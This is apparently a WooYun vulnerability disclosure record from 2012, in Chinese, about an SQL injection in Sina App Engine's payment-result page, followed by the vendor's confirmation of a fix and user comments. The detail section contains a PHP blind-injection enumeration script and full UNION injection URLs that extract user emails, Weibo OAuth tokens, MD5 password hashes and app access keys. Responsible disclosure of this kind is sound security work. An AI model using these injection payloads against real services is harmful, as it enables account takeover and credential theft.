{"id": 17162, "wybug_id": "wooyun-2012-011189", "wybug_title": "新浪SAE沦陷，oauth token/安全密码全部泄露，hack任意app", "wybug_corp": "新浪", "wybug_author": "牛奶坦克", "wybug_date": "2012-08-22 19:50", "wybug_open_date": "2012-10-06 19:50", "wybug_type": "内部绝密信息泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "服务器配置失误", "服务器配置不当", "渗透测试思路", "运维管理不当", "旁注渗透测试思路"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-06：\t细节向公众公开  简要描述： 下午本打算给SAE冲几个云豆试试短信功能，因为很久没黑箱了，就想看看支付问题，结果却发现另一个漏洞，可以获取sae上你想到的所有信息，危及所有用户，一泻千里啊一泻千里，顺手带走了“互联网那点事”（此站建立在SAE上），测试了以下沦陷任意SAE站点的想法...不过官方大可放心，并没有拖库也没有看订单信息，赶紧修复吧：）PS：没想到啊没想到，还没研究sae沙箱环境，在主站就找到了短板，而且短的可怕。 详细说明：  问题归根结底是一个SQL注入，SAE为什么会有注射？想完抽了自己一巴掌，SAE为什么不能有注射？！一般明面的问题sina安全团队可以发现，而且也会被过路黑客帮忙检测，凭着直觉，问题会出现在一些角落，一些不被人注意到的地方，就在这里：\nhttp://sae.sina.com.cn/pay/result/xft?sae_internal=1&may_fail=0&order_id=1\n一个付费信息反馈页面，用sqlmap跑了一下，这个傻缺居然告诉我只能盲注。。。自己写了个临时脚本跑数据库。\n<?php$url = \"http://sae.sina.com.cn/pay/result/xft?sae_internal=1&may_fail=0&order_id=1'\";for ($i=0; $i < 1000; $i++) {  //很搓吧。。\t$res = explode(\"|\",curlrequest($url.urlencode(\" and 1=2 union select 1,concat(0x7c,COLUMN_NAME,0x7c),3,4,5 from information_schema.COLUMNS where TABLE_NAME='user' limit $i,1#\")));\techo $res[10].\"\\r\\n\";}省略curl定义\n部分数据\ndatabase:information_schemaapp_storecroncron2cron_resultmysql_statsaesae_javasae_nodejsswsUsertestxweiboadmin表    ->   idsws_uidnamepasswordemailtimelineroles_mailmobileapp表存放app相关信息，比如名称\\accesskey  -->namecn_nameapi_versionbiz_typedespdefault_versioncnamecreate_uidaccesskeygroup_namepool_namesvn_urlstatustimelinemysql_portold_statushashcookieplatformlangapp_typemiddle_typeiconstatus_flagsdelete_timeuser表存放用户所有信息，uid、oauth、email、sae的二次安全密码  --> idnameemailpassword_md5mobiletelstatustimelineexpiressws_uidold_statusleveldeletedmoneyplatformbeans_levelmobile_verifiedmobile_reverifiedis_activeweibo_uidweibo_nameemail_verifiedweibo_access_tokendevlevelvdunolevellevel_endtimelevel_notifyup_welcomedappmidis_qy_vendorlast_updateuserName\n省去过多的猜测部分了，直接查询互联网那点事的用户相关信息http://sae.sina.com.cn//pay/result/xft?sae_internal=1&may_fail=0&order_id=-1%27%20and%201=2%20union%20select%201,concat%280x7c,email,0x7c,weibo_name,0x7c,weibo_access_token,0x7c,password_md5,0x7c%29,3,4,5%20from%20sae.user%20where%20weibo_uid='1627825392'%20limit%200,1%23\n\n\n\n那个md5密码就是sae二次安全密码，这个密码还有牛比的用途，后面说。还可以查询accesskeyhttp://sae.sina.com.cn//pay/result/xft?sae_internal=1&may_fail=0&order_id=-1%27%20and%201=2%20union%20select%201,concat%280x7c,accesskey,0x7c,create_uid,0x7c%29,3,4,5%20from%20sae.app%20limit%200,1%23\n\n可以看出想控制一个app所需的信息全部齐全了。。8过，还可以利用更简单的方法，svn，sae svn的密码就是sae二次安全密码，嘿嘿。\n\n\n\n好了，试试黑掉sae上任意的app吧。   漏洞证明：  \n\n\n\n\n\n证明完毕，结贴。   修复方案：  其实就是个注射而已，但是数据库如此透明想不通，权限。。可以在数据库内找到想要的一切信息啊，是不是需要反省下？   版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-08-22 21:49 厂商回复： 多谢牛奶坦克，此问题已经修复。现在的密码已经是进行加盐处理过的，请大家放心使用。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-08-22 19:52 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  我信洞主！    \n     2012-08-22 19:54 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我信洞主！    \n     2012-08-22 19:56 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  是不是哟~    \n     2012-08-22 19:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @goderci 所以我说信洞主    \n     2012-08-22 20:07 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  我信洞主！    \n     2012-08-22 20:07 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我信洞主。。    \n     2012-08-22 20:14 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  我信洞主！搞了 多久洞主终于搞下来了。。。想当年。。。    \n     2012-08-22 20:18 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  我信洞主！    \n     2012-08-22 20:18 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  @xsser 那我信！！！    \n     2012-08-22 20:18 |    \t\tlanz \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | whatever)\t\t \n  占座围观    \n     2012-08-22 20:29 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  我信洞主！    \n     2012-08-22 20:34 |    \t\tEoh \t\t\t( 普通白帽子  |\t\t\t        Rank:286 漏洞数:35        )\t\t \n  @xsser 我信xsser ，碉堡了 碉堡了。    \n     2012-08-22 20:36 |    \t\t小一 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:13        )\t\t \n  @xsser 乌云不就是用的SAE么？    \n     2012-08-22 20:36 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  有杀气啊 @胯下有杀气    \n     2012-08-22 20:37 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  潜这么久的水了，看来得冒个泡了。    \n     2012-08-22 20:51 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  搬凳子看故事。    \n     2012-08-22 20:51 |    \t\tlivers \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:6        | mov esp,0jmp espcrash.....)\t\t \n  百万流量涌向sea    \n     2012-08-22 20:56 |    \t\t波波虎 \t\t\t( 普通白帽子  |\t\t\t        Rank:266 漏洞数:51        | 11111111111)\t\t \n  云不安全了。。。。    \n     2012-08-22 21:08 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  我艹    \n     2012-08-22 21:20 |    \t\tLog \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        )\t\t \n   占座...    \n     2012-08-22 21:37 |    \t\t0gucci \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:33        | 深度值得深入)\t\t \n  之前在zone社区里的讨论难道今天有突破了0 0#    \n     2012-08-22 21:39 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  火了。膜拜    \n     2012-08-22 21:58 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  密码已经是进行加盐处理过的，请大家放心使用    \n     2012-08-22 22:15 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  加盐处理？“盐”我不懂，求科普    \n     2012-08-22 22:21 |    \t\tneal \t\t\t( 普通白帽子  |\t\t\t        Rank:219 漏洞数:23        )\t\t \n  老实交代 拖了wooyun没    \n     2012-08-22 22:22 |    \t\tneal \t\t\t( 普通白帽子  |\t\t\t        Rank:219 漏洞数:23        )\t\t \n  盐 == salt     \n     2012-08-22 22:25 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @zeracker 就是被腌过了    \n     2012-08-22 22:39 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  已经加了盐的。。    \n     2012-08-22 22:52 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:21        | 晚安,牛奶)\t\t \n  @zhk 开始我也以为是有盐，不过试过后发现。。。    \n     2012-08-22 23:26 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @牛奶坦克 是还有其他方式登录吧    \n     2012-08-22 23:35 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:21        | 晚安,牛奶)\t\t \n  @zhk 不可多说了啊，等公开吧，官方反映很快，已经修复了，后面还有一些潜在问题在加固可能，不能透漏太多细节。    \n     2012-08-22 23:35 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  新浪处理很迅速啊    \n     2012-08-23 00:08 |    \t\tghy459 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:5        | 深挖洞，广积shell。)\t\t \n  加盐是啥意思呢请问= =    \n     2012-08-23 00:30 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @ghy459 就给加点料，你就吃不出原来是什么了    \n     2012-08-23 00:51 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:21        | 晚安,牛奶)\t\t \n  @zhk  好抽象的比喻，我喜欢，很恰当    \n     2012-08-23 07:37 |    \t\tkrbl \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:13        | ♦♠♣♫♪☼☻☺ஐ♥♀♂☆๑۩۞۩๑☜☞...)\t\t \n  加盐被阎成咸肉了?    \n     2012-08-23 08:35 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  @牛奶坦克 擦  ~~  乌云的库也被你脱了？？？？ 改密码啊大家~！！    \n     2012-08-23 08:39 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @坏虾 乌云是md5(email.md5(password))的    \n     2012-08-23 08:42 |    \t\tTopman王 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:6        | 软件开发工程师!白帽子!XSSER,渗透,SEO)\t\t \n  搬凳子看故事。    \n     2012-08-23 09:00 |    \t\t大和尚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:5        | www.ieroot.com 积极向上的心态！百折不挠...)\t\t \n  坐等讲座公开    \n     2012-08-23 09:30 |    \t\t啤酒 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:8        | 道不同.喝酒结盟)\t\t \n  吓死我了，sae目标太大..    \n     2012-08-23 09:48 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @xsser 算法不能讲呀，亲~~~~~~~脱裤了就恼火了~~~    \n     2012-08-23 09:56 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  我信洞主！    \n     2012-08-23 10:24 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  @xsser @小胖子 我相信剑哥是举例说明一下的。    \n     2012-08-23 10:29 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  我信洞主！    \n     2012-08-23 10:32 |    \t\tcnyouker \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:13        | root it)\t\t \n  占座围观    \n     2012-08-23 10:34 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  后悔高中数学荒了，大学密码学残了……T_T    \n     2012-08-23 10:37 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  膜拜下~    \n     2012-08-23 10:38 |    \t\tGaRY \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:3        | 真悲剧平男君)\t\t \n  膜拜楼主    \n     2012-08-23 11:16 |    \t\t墨水心_Len \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:15        | PKAV技术宅 | 每一个有文化的东西，我们都...)\t\t \n  我信洞烛！    \n     2012-08-23 11:39 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @xsser 谢了    \n     2012-08-23 13:00 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  云豆T T    \n     2012-08-23 13:04 |    \t\t0gucci \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:33        | 深度值得深入)\t\t \n  现在的密码加盐过...也就是说之前的密码还没加盐吗-_,    \n     2012-08-23 14:06 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  官方说的是现在的密码加盐，这么说之前就是普通md5了    \n     2012-08-23 20:58 |    \t\t神刀 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | www.shellsec.com内射那么牛，虾米没妹子？)\t\t \n  我信洞主！    \n     2012-08-23 22:46 |    \t\t笑傲浆糊 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        | 没死，还活在)\t\t \n  云服务就是个炸弹，随时会爆炸    \n     2012-09-07 13:20 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  密码已经是进行加盐处理过的，请大家放心使用    \n     2012-09-12 00:36 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  十个wb太鸡巴贵了-,-!!    \n     2012-09-12 08:49 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Xhm1n9 那就等等 最终会开放啊    \n     2012-09-12 14:10 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  @xsser 穷人，只能等等了 -,-!!    \n     2012-09-12 14:18 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  一辈子用英特尔cpu的命    \n     2012-09-22 08:21 |    \t\t瀚海书香 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 主要从事网络安全和linux内核网络部分的研...)\t\t \n  salt md5应该是常识啊，但愿sae其他的api都改了    \n     2012-09-22 10:01 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  NB!    \n     2012-09-23 10:16 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  有盾行不？    \n     2012-09-26 13:42 |    \t\t九九 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 暂无。)\t\t \n  。。。。    \n     2012-09-28 03:02 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  update一下money啊~    \n     2012-10-01 18:46 |    \t\tsnower \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 君子不器)\t\t \n  再加点醋。。。    \n     2012-10-06 20:33 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  碉堡了。 一个注射点引起的血案    \n     2012-10-08 12:05 |    \t\tleehenwu \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:24        | 撸·啊·撸)\t\t \n  真没拖？！    \n     2012-10-08 13:54 |    \t\t坏人咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:4        | 做一个简简单单的坏人)\t\t \n  我信洞主！    \n     2012-10-18 09:27 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  请放心使用~    \n     2012-10-31 21:51 |    \t\tXeyes \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 好好学习，天天休息。)\t\t \n  碉堡了..............撸主老实交代，偷偷充了多少芸豆~    \n     2012-12-15 15:46 |    \t\t冰封 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 认真做事,低调求发展! Mr.Fz's)\t\t \n  一个注射点引起的血案!洞主是个神！    \n     2013-08-28 14:21 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:20        | 天一)\t\t \n  霸气。。    \n     2014-05-25 10:27 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  @牛奶坦克 求一下那个盲注脚本的完整版，小菜学习一下可好    \n     2015-08-05 16:42 |    \t\t枯荣 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | QQ)\t\t \n  懂了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}